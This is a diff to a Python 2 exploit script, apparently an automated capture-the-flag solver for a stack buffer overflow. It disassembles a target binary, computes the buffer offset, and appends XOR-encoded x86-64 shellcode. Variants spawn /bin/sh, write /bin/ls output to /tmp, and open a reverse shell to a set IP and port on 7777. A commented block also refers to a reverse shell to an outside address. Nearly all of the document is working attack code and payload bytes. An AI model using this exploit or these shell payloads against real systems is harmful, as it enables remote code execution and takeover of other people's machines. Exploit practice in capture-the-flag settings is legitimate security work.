@@ -284,9 +284,8 @@ def get_info(data):
 	key_check = " ".join(key_check)
 
 	end_pos = func_addr = data.find(func_name + ":")
-	size, start_pos, end_pos = get_value_from(data[cmp_addr:], "lea    -", "(%rbp)", end_pos)
+	size, start_pos, end_pos = get_value_from(data[end_pos:], "lea    -", "(%rbp)", end_pos)
 	size = int(size, 16)
-
 	#get set_args_addr and call_func_addr
 	main_leave_addr = data[main_pos:].find("leaveq") + main_pos
 	print "main_leave_addr:", main_leave_addr
@@ -328,6 +327,8 @@ def get_got_table(data):
 def pwn(io, fromfile = False):
 	
 	if fromfile == False:
+
+		run_cmd("rm binary*")
 		data = get_data(io, fromfile)
 		#buf = StringIO(data)
 		#f = zipfile.ZipFile(file = buf)
@@ -338,7 +339,7 @@ def pwn(io, fromfile = False):
 
 		run_cmd("uncompress binary1.z")
 		io.read_until("remember you only have 10 seconds... hurry up!\n")
-	
+
 	data = run_cmd("objdump -d binary1")
 	print "-------------------disassemble-------------------"
 	#print data
@@ -360,6 +361,7 @@ def pwn(io, fromfile = False):
 
 	rbp = l64(0x10101010101010101010)
 	ret = l64(0x10101010101010101010)
+
 	shellcode =  'a' * size + rbp
 
 	#get got table
@@ -417,11 +419,22 @@ def pwn(io, fromfile = False):
 	#jmp_esp_code = asm("jmp rsp")
 	#shellcode += jmp_esp_code
 
+	"""
+	#/bin/ls > /tmp/ls.result
+	shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
+	shellcode += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
+	shellcode += "\x52\xe8\x19\x00\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73"
+	shellcode += "\x20\x3e\x20\x2f\x74\x6d\x70\x2f\x6c\x73\x2e\x72\x65"
+	shellcode += "\x73\x75\x6c\x74\x00\x56\x57\x48\x89\xe6\x0f\x05"
+	"""
+
+	#system shell
 	shellcode += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
 	shellcode += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
 	shellcode += "\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"
 	shellcode += "\x00\x56\x57\x48\x89\xe6\x0f\x05"
-	
+
+
 	"""
 	#remote 199.188.74.220, 7777
 	shellcode += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
@@ -441,6 +454,23 @@ def pwn(io, fromfile = False):
 	shellcode += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
 	shellcode += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
 	"""
+
+	ip = "127.0.0.1"
+	ip = "192.168.174.134"
+	port = 7777
+	ip_data = "".join([l8(int(c)) for c in ip.split('.')])
+	port_data = l16(port)[::-1]
+
+	shellcode_model = ""
+	shellcode_model += "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
+	shellcode_model += "\x97\x48\xb9\x02\x00" + port_data + ip_data + "\x51\x48"
+	shellcode_model += "\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
+	shellcode_model += "\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
+	shellcode_model += "\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
+	shellcode_model += "\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
+
+	#shellcode += shellcode_model
+
 	shellcode_list = []
 	for index, c in enumerate(shellcode):
 		if index & 1 == 1:
@@ -449,7 +479,7 @@ def pwn(io, fromfile = False):
 			shellcode_list.append("%02x"%((ord(c) ^ opcode1)&0xff))
 	shellcode = "".join(shellcode_list)
 
-	payload += shellcode
+	payload += shellcode + "00"
 	print payload
 	if fromfile == True:
 		file_w = open("exp.dat", 'w')
@@ -460,6 +490,7 @@ def pwn(io, fromfile = False):
 		io.interact()
 
 
+
 #data = run_cmd("objdump -d -M x86-64 binary1_3\n")
 #print get_info(data)
 #exit(0)
@@ -468,8 +499,8 @@ def pwn(io, fromfile = False):
 target = "./binary1"
 io = get_io(target)
 pwn(io, fromfile = True)
-"""
 
+"""
 #remote
 io = get_io(target)
 pwn(io, fromfile = False)
